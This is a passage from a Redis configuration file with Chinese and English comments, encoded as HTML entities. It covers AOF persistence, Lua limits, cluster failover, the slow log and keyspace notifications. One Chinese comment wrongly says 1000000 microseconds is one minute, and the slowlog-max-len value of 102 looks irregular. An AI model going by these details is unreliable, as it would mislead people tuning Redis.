&#x7B97;&#x6CD5;&#x90FD;&#x4E0D;&#x662F;&#x7CBE;&#x51C6;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x76F8;&#x5BF9;&#x7CBE;&#x786E;&#x7684;&#x7B97;&#x6CD5;(&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;)&#xFF0C;&#x968F;&#x610F;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6837;&#x672C;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x9ED8;&#x8BA4;&#x7684;&#x7070;&#x9009;&#x62E9;3&#x4E2A;&#x6837;&#x672C;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;maxmemory-samples&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory-samples 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#################################### AOF ####################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis&#x4F1A;&#x5728;&#x540E;&#x53F0;&#x5F02;&#x6B65;&#x7684;&#x628A;&#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4F46;&#x662F;&#x8BE5;&#x5907;&#x4EFD;&#x662F;&#x975E;&#x5E38;&#x8017;&#x65F6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5907;&#x4EFD;&#x4E5F;&#x4E0D;&#x80FD;&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8BF8;&#x5982;&#x62C9;&#x95F8;&#x9650;&#x7535;&#x3001;&#x62D4;&#x63D2;&#x5934;&#x7B49;&#x72B6;&#x51B5;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x9020;&#x6210;&#x6BD4;&#x8F83;&#x5927;&#x8303;&#x56F4;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5907;&#x4EFD;&#x53CA;&#x707E;&#x96BE;&#x6062;&#x590D;&#x65B9;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F00;&#x542F;append only&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;redis&#x4F1A;&#x628A;&#x6240;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x5199;&#x64CD;&#x4F5C;&#x8BF7;&#x6C42;&#x90FD;&#x8FFD;&#x52A0;&#x5230;appendonly.aof&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5F53;redis&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x4ECE;&#x8BE5;&#x6587;&#x4EF6;&#x6062;&#x590D;&#x51FA;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4F1A;&#x9020;&#x6210;appendonly.aof&#x6587;&#x4EF6;&#x8FC7;&#x5927;&#xFF0C;&#x6240;&#x4EE5;redis&#x8FD8;&#x652F;&#x6301;&#x4E86;BGREWRITEAOF&#x6307;&#x4EE4;&#xFF0C;&#x5BF9;appendonly.aof &#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6574;&#x7406;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5F00;&#x542F;asynchronous dumps &#x548C; AOF</span></span><br><span class=\"line\"> </span><br><span class=\"line\">appendonly no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># AOF&#x6587;&#x4EF6;&#x540D;&#x79F0; (&#x9ED8;&#x8BA4;: &quot;appendonly.aof&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># appendfilename appendonly.aof</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis&#x652F;&#x6301;&#x4E09;&#x79CD;&#x540C;&#x6B65;AOF&#x6587;&#x4EF6;&#x7684;&#x7B56;&#x7565;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># no: &#x4E0D;&#x8FDB;&#x884C;&#x540C;&#x6B65;&#xFF0C;&#x7CFB;&#x7EDF;&#x53BB;&#x64CD;&#x4F5C; . Faster.</span></span><br><span class=\"line\"><span class=\"comment\"># always: always&#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x8FDB;&#x884C;&#x540C;&#x6B65;. Slow, Safest.</span></span><br><span class=\"line\"><span class=\"comment\"># everysec: &#x8868;&#x793A;&#x5BF9;&#x5199;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x7D2F;&#x79EF;&#xFF0C;&#x6BCF;&#x79D2;&#x540C;&#x6B65;&#x4E00;&#x6B21;. Compromise.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x662F;&quot;everysec&quot;&#xFF0C;&#x6309;&#x7167;&#x901F;&#x5EA6;&#x548C;&#x5B89;&#x5168;&#x6298;&#x4E2D;&#x8FD9;&#x662F;&#x6700;&#x597D;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x60F3;&#x8BA9;Redis&#x80FD;&#x66F4;&#x9AD8;&#x6548;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;no&quot;&#xFF0C;&#x8BA9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x51B3;&#x5B9A;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x53BB;&#x6267;&#x884C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6216;&#x8005;&#x76F8;&#x53CD;&#x60F3;&#x8BA9;&#x6570;&#x636E;&#x66F4;&#x5B89;&#x5168;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&quot;always&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E0D;&#x786E;&#x5B9A;&#x5C31;&#x7528; &quot;everysec&quot;.</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># appendfsync always</span></span><br><span class=\"line\">appendfsync everysec</span><br><span class=\"line\"><span class=\"comment\"># appendfsync no</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># AOF&#x7B56;&#x7565;&#x8BBE;&#x7F6E;&#x4E3A;always&#x6216;&#x8005;everysec&#x65F6;&#xFF0C;&#x540E;&#x53F0;&#x5904;&#x7406;&#x8FDB;&#x7A0B;(&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x6216;&#x8005;AOF&#x65E5;&#x5FD7;&#x91CD;&#x5199;)&#x4F1A;&#x6267;&#x884C;&#x5927;&#x91CF;&#x7684;I/O&#x64CD;&#x4F5C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x67D0;&#x4E9B;Linux&#x914D;&#x7F6E;&#x4E2D;&#x4F1A;&#x963B;&#x6B62;&#x8FC7;&#x957F;&#x7684;fsync()&#x8BF7;&#x6C42;&#x3002;&#x6CE8;&#x610F;&#x73B0;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4FEE;&#x590D;&#xFF0C;&#x5373;&#x4F7F;fsync&#x5728;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5904;&#x7406;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3A;&#x4E86;&#x51CF;&#x7F13;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;no-appendfsync-on-rewrite</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># This means that while another child is saving the durability of Redis is</span></span><br><span class=\"line\"><span class=\"comment\"># the same as &quot;appendfsync none&quot;, that in pratical terms means that it is</span></span><br><span class=\"line\"><span class=\"comment\"># possible to lost up to 30 seconds of log in the worst scenario (with the</span></span><br><span class=\"line\"><span class=\"comment\"># default Linux settings).</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</span></span><br><span class=\"line\"><span class=\"comment\"># &quot;no&quot; that is the safest pick from the point of view of durability.</span></span><br><span class=\"line\">no-appendfsync-on-rewrite no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Automatic rewrite of the append only file.</span></span><br><span class=\"line\"><span class=\"comment\"># AOF &#x81EA;&#x52A8;&#x91CD;&#x5199;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;AOF&#x6587;&#x4EF6;&#x589E;&#x957F;&#x5230;&#x4E00;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;Redis&#x80FD;&#x591F;&#x8C03;&#x7528; BGREWRITEAOF &#x5BF9;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x5199; </span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B83;&#x662F;&#x8FD9;&#x6837;&#x5DE5;&#x4F5C;&#x7684;&#xFF1A;Redis&#x4F1A;&#x8BB0;&#x4F4F;&#x4E0A;&#x6B21;&#x8FDB;&#x884C;&#x4E9B;&#x65E5;&#x5FD7;&#x540E;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;(&#x5982;&#x679C;&#x4ECE;&#x5F00;&#x673A;&#x4EE5;&#x6765;&#x8FD8;&#x6CA1;&#x8FDB;&#x884C;&#x8FC7;&#x91CD;&#x5199;&#xFF0C;&#x90A3;&#x65E5;&#x5B50;&#x5927;&#x5C0F;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x786E;&#x5B9A;)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x57FA;&#x7840;&#x5927;&#x5C0F;&#x4F1A;&#x540C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;&#x5982;&#x679C;&#x73B0;&#x5728;&#x7684;&#x5927;&#x5C0F;&#x6BD4;&#x57FA;&#x7840;&#x5927;&#x5C0F;&#x5927;&#x5236;&#x5B9A;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x91CD;&#x5199;&#x529F;&#x80FD;&#x5C06;&#x542F;&#x52A8;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x540C;&#x65F6;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6700;&#x5C0F;&#x5927;&#x5C0F;&#x7528;&#x4E8E;AOF&#x91CD;&#x5199;&#xFF0C;&#x8FD9;&#x4E2A;&#x7528;&#x4E8E;&#x963B;&#x6B62;&#x5373;&#x4F7F;&#x6587;&#x4EF6;&#x5F88;&#x5C0F;&#x4F46;&#x662F;&#x589E;&#x957F;&#x5E45;&#x5EA6;&#x5F88;&#x5927;&#x4E5F;&#x53BB;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; percentage &#x4E3A;0&#x5C31;&#x5173;&#x95ED;&#x8FD9;&#x4E2A;&#x7279;&#x6027;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">auto-aof-rewrite-percentage 100</span><br><span class=\"line\">auto-aof-rewrite-min-size 64mb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################## LUA SCRIPTING  ###############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Max execution time of a Lua script in milliseconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If the maximum execution time is reached Redis will log that a script is</span></span><br><span class=\"line\"><span class=\"comment\"># still in execution after the maximum allowed time and will start to</span></span><br><span class=\"line\"><span class=\"comment\"># reply to queries with an error.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># When a long running script exceed the maximum execution time only the</span></span><br><span class=\"line\"><span class=\"comment\"># SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be</span></span><br><span class=\"line\"><span class=\"comment\"># used to stop a script that did not yet called write commands. The second</span></span><br><span class=\"line\"><span class=\"comment\"># is the only way to shut down the server in the case a write commands was</span></span><br><span class=\"line\"><span class=\"comment\"># already issue by the script but the user don&apos;t want to wait for the natural</span></span><br><span class=\"line\"><span class=\"comment\"># termination of the script.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Set it to 0 or a negative value for unlimited execution without warnings.</span></span><br><span class=\"line\">lua-time-limit 5000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ REDIS &#x96C6;&#x7FA4;  ###############################</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x542F;&#x7528;&#x6216;&#x505C;&#x7528;&#x96C6;&#x7FA4;</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-enabled yes</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Every cluster node has a cluster configuration file. This file is not</span></span><br><span class=\"line\"><span class=\"comment\"># intended to be edited by hand. It is created and updated by Redis nodes.</span></span><br><span class=\"line\"><span class=\"comment\"># Every Redis Cluster node requires a different cluster configuration file.</span></span><br><span class=\"line\"><span class=\"comment\"># Make sure that instances running in the same system does not have</span></span><br><span class=\"line\"><span class=\"comment\"># overlapping cluster configuration file names.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-config-file nodes-6379.conf</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Cluster node timeout is the amount of milliseconds a node must be unreachable </span></span><br><span class=\"line\"><span class=\"comment\"># for it to be considered in failure state.</span></span><br><span class=\"line\"><span class=\"comment\"># Most other internal time limits are multiple of the node timeout.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-node-timeout 15000</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># A slave of a failing master will avoid to start a failover if its data</span></span><br><span class=\"line\"><span class=\"comment\"># looks too old.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># There is no simple way for a slave to actually have a exact measure of</span></span><br><span class=\"line\"><span class=\"comment\"># its &quot;data age&quot;, so the following two checks are performed:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) If there are multiple slaves able to failover, they exchange messages</span></span><br><span class=\"line\"><span class=\"comment\">#    in order to try to give an advantage to the slave with the best</span></span><br><span class=\"line\"><span class=\"comment\">#    replication offset (more data from the master processed).</span></span><br><span class=\"line\"><span class=\"comment\">#    Slaves will try to get their rank by offset, and apply to the start</span></span><br><span class=\"line\"><span class=\"comment\">#    of the failover a delay proportional to their rank.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Every single slave computes the time of the last interaction with</span></span><br><span class=\"line\"><span class=\"comment\">#    its master. This can be the last ping or command received (if the master</span></span><br><span class=\"line\"><span class=\"comment\">#    is still in the &quot;connected&quot; state), or the time that elapsed since the</span></span><br><span class=\"line\"><span class=\"comment\">#    disconnection with the master (if the replication link is currently down).</span></span><br><span class=\"line\"><span class=\"comment\">#    If the last interaction is too old, the slave will not try to failover</span></span><br><span class=\"line\"><span class=\"comment\">#    at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform</span></span><br><span class=\"line\"><span class=\"comment\"># the failover if, since the last interaction with the master, the time</span></span><br><span class=\"line\"><span class=\"comment\"># elapsed is greater than:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   (node-timeout * slave-validity-factor) + repl-ping-slave-period</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># So for example if node-timeout is 30 seconds, and the slave-validity-factor</span></span><br><span class=\"line\"><span class=\"comment\"># is 10, and assuming a default repl-ping-slave-period of 10 seconds, the</span></span><br><span class=\"line\"><span class=\"comment\"># slave will not try to failover if it was not able to talk with the master</span></span><br><span class=\"line\"><span class=\"comment\"># for longer than 310 seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A large slave-validity-factor may allow slaves with too old data to failover</span></span><br><span class=\"line\"><span class=\"comment\"># a master, while a too small value may prevent the cluster from being able to</span></span><br><span class=\"line\"><span class=\"comment\"># elect a slave at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For maximum availability, it is possible to set the slave-validity-factor</span></span><br><span class=\"line\"><span class=\"comment\"># to a value of 0, which means, that slaves will always try to failover the</span></span><br><span class=\"line\"><span class=\"comment\"># master regardless of the last time they interacted with the master.</span></span><br><span class=\"line\"><span class=\"comment\"># (However they&apos;ll always try to apply a delay proportional to their</span></span><br><span class=\"line\"><span class=\"comment\"># offset rank).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Zero is the only value able to guarantee that when all the partitions heal</span></span><br><span class=\"line\"><span class=\"comment\"># the cluster will always be able to continue.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-slave-validity-factor 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Cluster slaves are able to migrate to orphaned masters, that are masters</span></span><br><span class=\"line\"><span class=\"comment\"># that are left without working slaves. This improves the cluster ability</span></span><br><span class=\"line\"><span class=\"comment\"># to resist to failures as otherwise an orphaned master can&apos;t be failed over</span></span><br><span class=\"line\"><span class=\"comment\"># in case of failure if it has no working slaves.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Slaves migrate to orphaned masters only if there are still at least a</span></span><br><span class=\"line\"><span class=\"comment\"># given number of other working slaves for their old master. This number</span></span><br><span class=\"line\"><span class=\"comment\"># is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave</span></span><br><span class=\"line\"><span class=\"comment\"># will migrate only if there is at least 1 other working slave for its master</span></span><br><span class=\"line\"><span class=\"comment\"># and so forth. It usually reflects the number of slaves you want for every</span></span><br><span class=\"line\"><span class=\"comment\"># master in your cluster.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Default is 1 (slaves migrate only if their masters remain with at least</span></span><br><span class=\"line\"><span class=\"comment\"># one slave). To disable migration just set it to a very large value.</span></span><br><span class=\"line\"><span class=\"comment\"># A value of 0 can be set but is useful only for debugging and dangerous</span></span><br><span class=\"line\"><span class=\"comment\"># in production.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># cluster-migration-barrier 1</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># In order to setup your cluster make sure to read the documentation</span></span><br><span class=\"line\"><span class=\"comment\"># available at http://redis.io web site.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################## SLOW LOG ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis Slow Log &#x8BB0;&#x5F55;&#x8D85;&#x8FC7;&#x7279;&#x5B9A;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x5305;&#x62EC;I/O&#x8BA1;&#x7B97;&#x6BD4;&#x5982;&#x8FDE;&#x63A5;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7B49;&#xFF0C;&#x53EA;&#x662F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x65F6;&#x95F4;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;slow log&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x544A;&#x8BC9;Redis&#x6267;&#x884C;&#x8D85;&#x8FC7;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x53C2;&#x6570;slowlog-log-slower-than(&#x5FAE;&#x5999;)&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53E6;&#x4E00;&#x4E2A;&#x662F;slow log &#x7684;&#x957F;&#x5EA6;&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x65B0;&#x547D;&#x4EE4;&#x88AB;&#x8BB0;&#x5F55;&#x7684;&#x65F6;&#x5019;&#x6700;&#x65E9;&#x7684;&#x547D;&#x4EE4;&#x5C06;&#x88AB;&#x4ECE;&#x961F;&#x5217;&#x4E2D;&#x79FB;&#x9664;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x4E0B;&#x9762;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x5FAE;&#x5999;&#x5FAE;&#x5355;&#x4F4D;&#xFF0C;&#x56E0;&#x6B64;1000000&#x4EE3;&#x8868;&#x4E00;&#x5206;&#x949F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x8D1F;&#x6570;&#x5C06;&#x5173;&#x95ED;&#x6162;&#x65E5;&#x5FD7;&#xFF0C;&#x800C;&#x8BBE;&#x7F6E;&#x4E3A;0&#x5C06;&#x5F3A;&#x5236;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x90FD;&#x4F1A;&#x8BB0;&#x5F55;</span></span><br><span class=\"line\">slowlog-log-slower-than 10000</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5BF9;&#x65E5;&#x5FD7;&#x957F;&#x5EA6;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x5B83;&#x4F1A;&#x6D88;&#x8017;&#x5185;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EF;&#x4EE5;&#x901A;&#x8FC7; SLOWLOG RESET &#x56DE;&#x6536;&#x88AB;&#x6162;&#x65E5;&#x5FD7;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;</span></span><br><span class=\"line\">slowlog-max-len 102</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################# Event notification ##############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis can notify Pub/Sub clients about events happening in the key space.</span></span><br><span class=\"line\"><span class=\"comment\"># This feature is documented at http://redis.io/topics/keyspace-events</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># For instance if keyspace events notification is enabled, and a client</span></span><br><span class=\"line\"><span class=\"comment\"># performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two</span></span><br><span class=\"line\"><span class=\"comment\"># messages will be published via Pub/Sub:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># PUBLISH __keyspace@0__:foo del</span></span><br><span class=\"line\"><span class=\"comment\"># PUBLISH __keyevent@0__:del foo</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># It is possible to select the events that Redis will notify among a set</span></span><br><span class=\"line\"><span class=\"comment\"># of classes. Every class is identified by a single character:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</span></span><br><span class=\"line\"><span class=\"comment\">#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</span></span><br><span class=\"line\"><span class=\"comment\">#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</span></span><br><span class=\"line\"><span class=\"comment\">#  $     String commands</span></span><br><span class=\"line\"><span class=\"comment\">#  l     List commands</span></span><br><span class=\"line\"><span class=\"comment\">#  s     Set commands</span></span><br><span class=\"line\"><span class=\"comment\">#  h     Hash commands</span></span><br><span class=\"line\"><span class=\"comment\">#  z     Sorted set commands</span></span><br><span class=\"line\"><span class=\"comment\">#  x     Expired events (events generated every time a key expires)</span></span><br><span class=\"line\"><span class=\"comment\">#  e     Evicted events (events generated when a key is evicted for maxmemory)</span></span><br><span class=\"line\"><span class=\"comment\">#  A     Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  The &quot;notify-keyspace-events&quot; takes as argument a string that is composed</span></span><br><span class=\"line\"><span class=\"comment\">#  by zero or multiple characters. The empty string means that notifications</span></span><br><span class=\"line\"><span class=\"comment\">#  are disabled at all.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  Example: to enable list and generic events, from the point of view of the</span></span><br><span class=\"line\"><span class=\"comment\">#           event name, use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  notify-keyspace-events Elg</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  Example 2: to get the stream of the expired keys subscribing to channel</span></span><br><span class=\"line\"><span class=\"comment\">#             name __keyevent@0__:expired use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  notify-keyspace-events Ex</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#  By default all notifications are disabled because most users don&apos;t need</span></span><br><span class=\"line\"><span class=\"comment\">#  this feature and the feature has some overhead. Note that if you don&apos;t</span></span><br><span class=\"line\"><span class=\"comment\">#  specify at least one of K or E, no events will be delivered.</span></span><br><span class=\"line\">notify-keyspace-events <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">############################### ADVANCED CONFIG ###############################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;hash&#x4E2D;&#x5305;&#x542B;&#x8D85;&#x8FC7;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x5E76;&#x4E14;&#x6700;&#x5927;&#x7684;&#x5143;&#x7D20;&#x6CA1;&#x6709;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x65F6;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># hash&#x5C06;&#x4EE5;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF08;&#x5927;&#x5927;&#x51CF;&#x5C11;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#xFF09;&#x6765;&#x5B58;&#x50A8;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8FD9;&#x4E24;&#x4E2A;&#x4E34;&#x754C;&#x503C;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis Hash&#x5BF9;&#x5E94;Value&#x5185;&#x90E8;&#x5B9E;&#x9645;&#x5C31;&#x662F;&#x4E00;&#x4E2A;HashMap&#xFF0C;&#x5B9E;&#x9645;&#x8FD9;&#x91CC;&#x4F1A;&#x6709;2&#x79CD;&#x4E0D;&#x540C;&#x5B9E;&#x73B0;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># 